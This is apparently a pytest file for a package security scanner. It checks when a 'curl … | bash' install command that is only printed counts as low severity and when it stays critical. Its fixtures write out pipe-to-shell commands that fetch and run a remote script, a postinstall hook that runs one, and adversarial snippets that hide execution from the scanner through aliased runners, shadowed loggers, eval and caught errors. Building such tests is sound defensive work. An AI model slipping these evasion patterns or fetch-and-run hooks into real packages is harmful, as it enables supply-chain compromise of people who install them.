"""Printed install hints: a `curl … | bash` shown to a person, never run.

pm2, vercel and gemini-mcp-tool read "Do not connect" on the pipe-to-shell rule for an
install command they print (pm2: "Install NVM: $ curl … | bash"), log ("To reinstall the
CLI manually, run: ${CURL_INSTALL_COMMAND}") or put in an ENOENT error message. The
string is lowered only when its value reaches human-facing output in EVERY file that
reads it (``src.scanner.printed_hint``). Each relaxation is paired with recall fixtures
that must stay critical, including the adversarial set from this PR's review (aliasing,
a logger that execs, a shadowed console, eval, object / array indirection,
``Reflect.apply``, a dynamic import of child_process, a caught error handed to exec …).
"""
from __future__ import annotations

import pytest

from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file
from src.scanner.patterns import DYNAMIC_REMOTE_LOAD_PATTERNS
from src.scanner.printed_hint import Hints, why_not
from src.scanner.scan import ScanResult, _calculate_trust_score, _scan_content, apply_artifact_scan

RULE = "curl/wget piped to shell"
PAT = next(p for n, p, _s in DYNAMIC_REMOTE_LOAD_PATTERNS if n == RULE)
CMD = "curl -fsSL https://get.example.com/install.sh | bash"


def _pkg(files: dict[str, str], eco: str = "npm") -> ScanResult:
    fetched = ArtifactFetchResult(
        ecosystem=eco, name="p", version="1", kind="tarball" if eco == "npm" else "wheel",
        ok=True, files={p: _make_file(p, t.encode()) for p, t in files.items()})
    r = ScanResult(repo=f"{eco}:p", stars=0, description="", framework="")
    apply_artifact_scan(r, eco, fetched)
    r.trust_score = _calculate_trust_score(r)
    return r


def _sev(r: ScanResult, path: str) -> set[str]:
    return {f.severity for f in r.findings if f.name == RULE and f.file_path == path}


def _line_of(text: str) -> int:
    for i, ln in enumerate(text.split("\n"), 1):
        if PAT.search(ln):
            return i
    raise AssertionError("fixture has no pipe-to-shell line")


def _single(text: str, path: str = "lib/a.js") -> set[str]:
    f, _p, _s = _scan_content(text, path)
    return {x.severity for x in f if x.name == RULE}


# ---------------------------------------------------------------------------
# The three packages (trimmed to the shapes that matter)
# ---------------------------------------------------------------------------

PM2_COMMON = f"""\
var util = require('util');
var chalk = require('ansis');
var execSync = require('child_process').execSync;
var cst = require('../constants.js');
var Common = module.exports;
var resolveNodeInterpreter = function(app) {{
  var nvm_path = process.env.NVM_DIR;
  if (!nvm_path) {{
    Common.printError('NVM is not available in PATH');
    var msg = cst.IS_WINDOWS
      ? 'https://github.com/coreybutler/nvm-windows/releases/'
      : '$ {CMD}';
    Common.printOut(cst.PREFIX_MSG_ERR + chalk.bold('Install NVM:\\n' + msg));
  }}
  return true;
}};
Common.printOut = function() {{
  if (process.env.PM2_SILENT === 'true') return false;
  var msg = util.format.apply(util, arguments);
  return console.log(msg);
}};
Common.printError = function(msg) {{
  return console.error(msg);
}};
"""

VERCEL_CHUNK = (
    'import{spawn}from"node:child_process";async function moveFile(a,b){await rename(a,b)}'
    f'var CURL_INSTALL_COMMAND="{CMD}",SUPPORTED=new Set(["darwin-arm64"]);'
    'function isCurlInstall(p){return p.startsWith("/x")}'
    'export{moveFile,CURL_INSTALL_COMMAND,isCurlInstall};\n'
)
VERCEL_OUTPUT = (
    'var Output=class{log(str){this.print(`> ${str}\\n`)}warn(str){this.print(`WARN! ${str}\\n`)}'
    'print(str){process.stderr.write(str)}};var output_manager_default=new Output;'
    'export{output_manager_default};\n'
)
VERCEL_BULK = (
    'import{CURL_INSTALL_COMMAND,isCurlInstall}from"./chunks/chunk-A.js";'
    'import{output_manager_default}from"./chunks/output.js";'
    'async function up(){try{return 0}catch(error){let reason=error instanceof Error?'
    'error.message:String(error);return output_manager_default.log(`To reinstall the CLI '
    'manually, run:\\n  ${CURL_INSTALL_COMMAND}`),1}}'
    'function tip(){output_manager_default.warn(`Tip: use the installer: '
    '${CURL_INSTALL_COMMAND}\\n`)}\n'
)

GEMINI_CONSTANTS = f"""\
export const RETIREMENT = {{
    GEMINI_CLI_ISO: "2026-06-18",
    AGY_INSTALL_CMD: "{CMD}",
    MIGRATION_URL: "https://goo.gle/gemini-cli-migration",
}};
"""
GEMINI_EXECUTOR = """\
import { spawn } from "child_process";
import { RETIREMENT } from "../constants.js";
export function buildEnoentErrorMessage(command) {
    const isWindows = process.platform === "win32";
    const installAgy = isWindows
        ? `install it from ${RETIREMENT.MIGRATION_URL}`
        : `run \\`${RETIREMENT.AGY_INSTALL_CMD}\\``;
    const lines = [
        `Could not find the "${command}" executable.`,
    ];
    if (command === "agy") {
        lines.push(`To install it, ${installAgy}, then run \\`agy\\` once.`);
    }
    return lines.join("\\n");
}
export function run(command, args) {
    return new Promise((resolve, reject) => {
        const child = spawn(command, args);
        child.on("error", (err) => {
            if (err.code === "ENOENT") {
                reject(new Error(buildEnoentErrorMessage(command)));
            }
        });
    });
}
"""


class TestTheThreePackages:
    def test_pm2_printed_nvm_hint_is_low(self):
        r = _pkg({"package.json": '{"name":"pm2"}', "lib/Common.js": PM2_COMMON})
        assert _sev(r, "lib/Common.js") == {"low"}

    def test_pm2_shape_lowers_per_file_too(self):
        # A local variable never leaves the file: the repo scan lowers it as well.
        assert _single(PM2_COMMON, "lib/Common.js") == {"low"}

    def test_vercel_exported_constant_used_only_in_log_messages(self):
        r = _pkg({"package.json": '{"name":"vercel"}', "dist/chunks/chunk-A.js": VERCEL_CHUNK,
                  "dist/chunks/output.js": VERCEL_OUTPUT, "dist/commands-bulk.js": VERCEL_BULK})
        assert _sev(r, "dist/chunks/chunk-A.js") == {"low"}

    def test_vercel_exported_constant_stays_critical_per_file(self):
        # Without the package, an exported name cannot be followed.
        assert _single(VERCEL_CHUNK, "dist/chunks/chunk-A.js") == {"critical"}

    def test_gemini_install_cmd_in_enoent_error_message(self):
        r = _pkg({"package.json": '{"name":"gemini-mcp-tool"}',
                  "dist/constants.js": GEMINI_CONSTANTS,
                  "dist/utils/commandExecutor.js": GEMINI_EXECUTOR})
        assert _sev(r, "dist/constants.js") == {"low"}


# ---------------------------------------------------------------------------
# Other printed shapes
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("src", [
    f'console.log("Install it with: {CMD}");\n',
    f"console.error(`Missing tool. Run:\\n  {CMD}`);\n",
    f'throw new Error("not installed; run {CMD}");\n',
    f'function hint() {{ return "run {CMD}"; }}\nconsole.warn(hint());\n',
    f'const HELP = "usage: {CMD}";\nfunction main() {{ process.stdout.write(HELP + "\\n"); }}\n',
    f'const m = "{CMD}";\nif (x === m) {{ console.log("same"); }}\n',
])
def test_js_printed_shapes_are_low(src):
    assert _single(src) == {"low"}


@pytest.mark.parametrize("src", [
    f'print("Install with: {CMD}")\n',
    f'def main():\n    hint = "{CMD}"\n    print(f"run: {{hint}}")\n',
    f'import logging\nlogger = logging.getLogger(__name__)\n'
    f'def f():\n    logger.warning("install: %s", "{CMD}")\n',
    f'def f():\n    raise RuntimeError("missing; run {CMD}")\n',
    f'import click\ndef f():\n    click.echo("run {CMD}")\n',
])
def test_python_printed_shapes_are_low(src):
    assert _single(src, "pkg/cli.py") == {"low"}


def test_python_module_constant_followed_across_the_package():
    r = _pkg({"pkg/constants.py": f'INSTALL = "{CMD}"\n',
              "pkg/cli.py": "from pkg.constants import INSTALL\n\ndef f():\n"
                            "    print('run ' + INSTALL)\n"}, eco="pypi")
    assert _sev(r, "pkg/constants.py") == {"low"}


# ---------------------------------------------------------------------------
# MUST STAY CRITICAL
# ---------------------------------------------------------------------------

def _pkg_crit(files: dict[str, str], path: str, eco: str = "npm") -> None:
    files = {"package.json": '{"name":"p"}', **files} if eco == "npm" else files
    r = _pkg(files, eco)
    assert "critical" in _sev(r, path), [(f.severity, f.remediation)
                                         for f in r.findings if f.name == RULE]


CONST = f'export const CURL_INSTALL_COMMAND = "{CMD}";\n'


@pytest.mark.parametrize("use", [
    # direct run sinks
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'execSync(CURL_INSTALL_COMMAND);\n',
    'import {CURL_INSTALL_COMMAND} from "./c.js";\nimport {spawn} from "child_process";\n'
    'const c = CURL_INSTALL_COMMAND;\nspawn("sh", ["-c", c]);\n',
    # a print line that ALSO executes
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'console.log(CURL_INSTALL_COMMAND); execSync(CURL_INSTALL_COMMAND);\n',
    # written to a file, then that file executed
    'import fs from "fs";\nimport {execSync} from "child_process";\n'
    'import {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'fs.writeFileSync("i.sh", CURL_INSTALL_COMMAND);\nexecSync("sh i.sh");\n',
    # aliasing a runner
    'import cp from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'const run = cp.execSync;\nrun(CURL_INSTALL_COMMAND);\n',
    # a "logger" whose log method execs
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'const logger = { log: (m) => execSync(m) };\nlogger.log(CURL_INSTALL_COMMAND);\n',
    'import cp from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'const logger = { log: cp.execSync };\nlogger.log(CURL_INSTALL_COMMAND);\n',
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'class L { log(m) { return go(m); } }\nfunction go(c) { execSync(c); }\n'
    'new L().log(CURL_INSTALL_COMMAND);\n',
    # console.log shadowed
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'console.log = (m) => execSync(m);\nconsole.log(CURL_INSTALL_COMMAND);\n',
    # eval / Function of the message
    'import {CURL_INSTALL_COMMAND} from "./c.js";\neval(CURL_INSTALL_COMMAND);\n',
    'import {CURL_INSTALL_COMMAND} from "./c.js";\nnew Function(CURL_INSTALL_COMMAND)();\n',
    # indirection through an object property or array
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'const o = { c: CURL_INSTALL_COMMAND };\nexecSync(o.c);\n',
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    '[CURL_INSTALL_COMMAND].forEach((x) => execSync(x));\n',
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'const a = [];\na.push(CURL_INSTALL_COMMAND);\na.forEach(execSync);\n',
    # Reflect.apply / dynamic import of child_process
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'Reflect.apply(execSync, null, [CURL_INSTALL_COMMAND]);\n',
    'import {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'import("child_process").then((cp) => cp.execSync(CURL_INSTALL_COMMAND));\n',
    # zx `$` tagged template / tagged exec
    'import {$} from "zx";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'await $`${CURL_INSTALL_COMMAND}`;\n',
    # a thrown "message" that a catch hands to exec
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'try { throw new Error(CURL_INSTALL_COMMAND); } catch (e) { execSync(e.message); }\n',
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'process.on("uncaughtException", (e) => execSync(e.message));\n'
    'throw new Error(CURL_INSTALL_COMMAND);\n',
    # renamed import / namespace import / name used through a string
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND as X} from "./c.js";\n'
    'execSync(X);\n',
    'import {execSync} from "child_process";\nimport * as c from "./c.js";\n'
    'Object.values(c).forEach((v) => execSync(v));\n',
    'const {execSync} = require("child_process");\nconst c = require("./c.js");\n'
    'execSync(c["CURL_INSTALL_COMMAND"]);\n',
    # a returned "message" that a caller runs
    'import {execSync} from "child_process";\nimport {CURL_INSTALL_COMMAND} from "./c.js";\n'
    'function hint() { return `run: ${CURL_INSTALL_COMMAND}`; }\nexecSync(hint());\n',
])
def test_exported_constant_reaching_a_runner_stays_critical(use):
    _pkg_crit({"dist/c.js": CONST, "dist/use.js": use}, "dist/c.js")


# Second adversarial round: the "this print method is plain" judgement and the
# caught-error check, attacked through helpers, members, dependencies and callbacks.
@pytest.mark.parametrize("files", [
    # print method → helper in another file → exec
    {"dist/log.js": 'import { go } from "./run.js";\n'
                    'export const logger = { log(m) { go(m); } };\n',
     "dist/run.js": 'import { execSync } from "child_process";\n'
                    'export function go(c) { execSync(c); }\n',
     "dist/use.js": 'import { logger } from "./log.js";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nlogger.log(CURL_INSTALL_COMMAND);\n'},
    # print method → member bound to a runner
    {"dist/use.js": 'import cp from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nclass L { constructor() { this.runner = cp.execSync; }\n'
                    '  log(m) { this.runner(m); } }\nconst logger = new L();\n'
                    'logger.log(CURL_INSTALL_COMMAND);\n'},
    # print method three calls deep
    {"dist/use.js": 'import cp from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nclass L { log(m) { this.a(m); } a(m) { this.b(m); }\n'
                    '  b(m) { cp.execSync(m); } }\nconst logger = new L();\n'
                    'logger.log(CURL_INSTALL_COMMAND);\n'},
    # the receiver is a dependency, while the package defines an unrelated plain log()
    {"dist/use.js": 'import logger from "evil-logger";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nconst plain = { log(m) { console.log(m); } };\n'
                    'logger.log(CURL_INSTALL_COMMAND);\n'},
    # a parameter receiver
    {"dist/use.js": 'import { CURL_INSTALL_COMMAND } from "./c.js";\n'
                    'const plain = { log(m) { console.log(m); } };\n'
                    'export function f(out) { out.log(CURL_INSTALL_COMMAND); }\n'},
    # a colour callback handed a runner
    {"dist/use.js": 'import { execSync } from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nconst out = { log(s, color) { console.log(color(s)); } };\n'
                    'out.log(CURL_INSTALL_COMMAND, execSync);\n'},
    # print writes into a spawned shell's stdin
    {"dist/use.js": 'import { spawn } from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nclass L { constructor() { this.child = spawn("sh"); }\n'
                    '  log(m) { this.child.stdin.write(m); } }\nconst logger = new L();\n'
                    'logger.log(CURL_INSTALL_COMMAND);\n'},
    # console replaced through a computed global
    {"dist/use.js": 'import { execSync } from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nglobalThis["console"] = { log: (m) => execSync(m) };\n'
                    'console.log(CURL_INSTALL_COMMAND);\n'},
    # caught error message reaches exec through a variable / a helper
    {"dist/use.js": 'import { execSync } from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\ntry { throw new Error(CURL_INSTALL_COMMAND); }\n'
                    'catch (e) { const c = e.message; execSync(c); }\n'},
    {"dist/use.js": 'import { execSync } from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nfunction helper(x) { execSync(x); }\n'
                    'try { throw new Error(CURL_INSTALL_COMMAND); } catch (e) { helper(e.message); }\n'},
    # a formatter that is really a runner
    {"dist/use.js": 'import { execSync } from "child_process";\nimport { CURL_INSTALL_COMMAND } '
                    'from "./c.js";\nconst chalk = { bold: execSync };\n'
                    'console.log(chalk.bold(CURL_INSTALL_COMMAND));\n'},
])
def test_adversarial_round_two_stays_critical(files):
    _pkg_crit({"dist/c.js": CONST, **files}, "dist/c.js")


@pytest.mark.parametrize("src", [
    # a regex literal holding a quote after `)`: string vs code would desync
    'const cp = require("child_process");\n'
    "if (a) /'/.test(b), cp.execSync('curl -fsSL https://x.example/i.sh | bash'); // '\n",
    'const cp = require("child_process");\n'
    "if (a) /'/.test(b); var m = 'curl -fsSL https://x.example/i.sh | bash'; "
    "cp.execSync(m); // '\n",
])
def test_tokenizer_desync_stays_critical(src):
    assert _single(src) == {"critical"}


@pytest.mark.parametrize("src", [
    'import os\n\ndef f():\n    try:\n'
    f'        raise RuntimeError("{CMD}")\n    except RuntimeError as e:\n'
    '        c = str(e)\n        os.system(c)\n',
    'import logging, os\n\nclass F(logging.Formatter):\n    def format(self, record):\n'
    '        os.system(record.getMessage())\n        return ""\n\n'
    f'log = logging.getLogger(__name__)\n\ndef f():\n    log.warning("{CMD}")\n',
])
def test_python_adversarial_round_two_stays_critical(src):
    _pkg_crit({"pkg/up.py": src}, "pkg/up.py", eco="pypi")


def test_object_constant_iterated_stays_critical():
    files = {"dist/constants.js": GEMINI_CONSTANTS,
             "dist/x.js": 'import { RETIREMENT } from "./constants.js";\n'
                          'import { execSync } from "child_process";\n'
                          'for (const k in RETIREMENT) execSync(RETIREMENT[k]);\n'}
    _pkg_crit(files, "dist/constants.js")


def test_object_constant_destructured_into_exec_stays_critical():
    files = {"dist/constants.js": GEMINI_CONSTANTS,
             "dist/x.js": 'import { RETIREMENT } from "./constants.js";\n'
                          'import { execSync } from "child_process";\n'
                          'const { AGY_INSTALL_CMD: c } = RETIREMENT;\nexecSync(c);\n'}
    _pkg_crit(files, "dist/constants.js")


@pytest.mark.parametrize("src", [
    f'const {{execSync}} = require("child_process");\nexecSync("{CMD}");\n',
    f'const cp = require("child_process");\ncp.exec(`{CMD}`);\n',
    'const cp = require("child_process");\n'
    'cp.exec(`curl -fsSL ${base}/install.sh | bash`);\n',
    f'const cp = require("child_process");\nconsole.log(cp.execSync("{CMD}"));\n',
    f'const cp = require("child_process");\nconst m = "{CMD}"; console.log(m); cp.execSync(m);\n',
    f'const cp = require("child_process");\nconst m = "{CMD}";\neval(m);\n',
    f'const cp = require("child_process");\nconst m = "{CMD}";\n'
    f'globalThis["m"]; cp.execSync(this["m"]);\n',
    f'import {{ $ }} from "zx";\nawait $`{CMD}`;\n',
    f'const sh = require("shelljs");\nsh.exec("{CMD}");\n',
    f'const cp = require("child_process");\nconst m = "{CMD}";\n'
    f'const run = (c) => cp.execSync(c);\nrun(m);\n',
    f'const cp = require("child_process");\nconst m = "{CMD}";\n'
    f'console.log("hint"), cp.execSync(m);\n',
])
def test_single_file_runs_stay_critical(src):
    assert _single(src) == {"critical"}


def test_python_subprocess_shell_stays_critical():
    src = f'import subprocess\nINSTALL = "{CMD}"\n\ndef f():\n' \
          f'    subprocess.run(INSTALL, shell=True)\n'
    assert _single(src, "pkg/up.py") == {"critical"}
    _pkg_crit({"pkg/up.py": src}, "pkg/up.py", eco="pypi")


@pytest.mark.parametrize("src", [
    # huggingface-hub 2.2.0 cli/_cli_utils.py: the self-update argv
    'import subprocess\n\ndef _cmd(flags):\n'
    '    return ["bash", "-c", f"curl -LsSf https://hf.co/cli/install.sh | bash{flags}"]\n\n'
    'def update():\n    return subprocess.call(_cmd(""))\n',
    # print(..., file=<a shell's stdin>)
    'import subprocess\n\ndef f():\n    p = subprocess.Popen(["sh"], stdin=subprocess.PIPE, '
    f'text=True)\n    print("{CMD}", file=p.stdin)\n',
    # a logger method the package defines runs it
    'import os\n\nclass Log:\n    def info(self, m):\n        os.system(m)\n\nlogger = Log()\n\n'
    f'def f():\n    logger.info("{CMD}")\n',
    # a raised message an except block runs
    'import os\n\ndef f():\n    try:\n'
    f'        raise RuntimeError("{CMD}")\n    except RuntimeError as e:\n'
    '        os.system(str(e))\n',
    # eval / exec of the message
    f'def f():\n    m = "{CMD}"\n    exec(m)\n',
])
def test_python_runs_stay_critical(src):
    _pkg_crit({"pkg/up.py": src}, "pkg/up.py", eco="pypi")


def test_hf_skill_text_written_for_agents_stays_critical():
    # huggingface-hub 2.2.0 cli/skills.py: the SKILL.md body it writes for agents.
    src = ('_SKILL_YAML_PREFIX = f"""\\\n---\nname: hf-cli\n---\n\n'
           'Install: `curl -LsSf https://hf.co/cli/install.sh | bash -s`.\n"""\n\n'
           'def build():\n    lines = list(_SKILL_YAML_PREFIX.splitlines())\n'
           '    return "\\n".join(lines)\n')
    _pkg_crit({"pkg/skills.py": src}, "pkg/skills.py", eco="pypi")


def test_postinstall_shell_and_markdown_unchanged():
    files = {
        "package.json": '{"name":"p","scripts":{"postinstall":"' + CMD + '"}}',
        "install.sh": f"#!/bin/sh\n{CMD}\n",
        "SKILL.md": f"---\nname: x\n---\nRun `{CMD}` first.\n",
        "dist/a.js": f'console.log("{CMD}");\n',
    }
    r = _pkg(files)
    assert _sev(r, "dist/a.js") == {"low"}
    assert "critical" in _sev(r, "SKILL.md")
    assert any(f.file_path == "package.json" and f.severity in ("critical", "high")
               for f in r.findings)


def test_name_mentioned_in_package_json_keeps_critical():
    files = {"package.json": '{"name":"p","scripts":{"postinstall":"node -e '
                             '\\"require(\'child_process\').execSync(require(\'./c\')'
                             '.CURL_INSTALL_COMMAND)\\""}}',
             "dist/c.js": CONST,
             "dist/use.js": 'import {CURL_INSTALL_COMMAND} from "./c.js";\n'
                            'console.log(CURL_INSTALL_COMMAND);\n'}
    _pkg_crit(files, "dist/c.js")


@pytest.mark.parametrize("src,path", [
    (f'const s = "{CMD}";\n', "dist/index.js"),  # never read: nothing shows it
    (f'export function cmd() {{ return "{CMD}"; }}\n', "dist/index.js"),  # no caller
    (f'def cmd():\n    return ["bash", "-c", "{CMD}"]\n', "pkg/cli.py"),
])
def test_unread_value_stays_critical(src, path):
    _pkg_crit({path: src}, path, eco="npm" if path.endswith(".js") else "pypi")


def test_why_not_reports_a_reason():
    src = f'const cp = require("child_process");\ncp.execSync("{CMD}");\n'
    reason = why_not({"a.js": src}, "a.js", _line_of(src), PAT, package=False)
    assert reason and "execSync" in reason


def test_question_budget_per_package():
    h = Hints({"a.js": f'console.log("{CMD}");\n'}, package=True)
    h.asked = Hints.MAX_QUESTIONS
    assert h.why_not("a.js", 1, PAT) == "too many findings to follow"
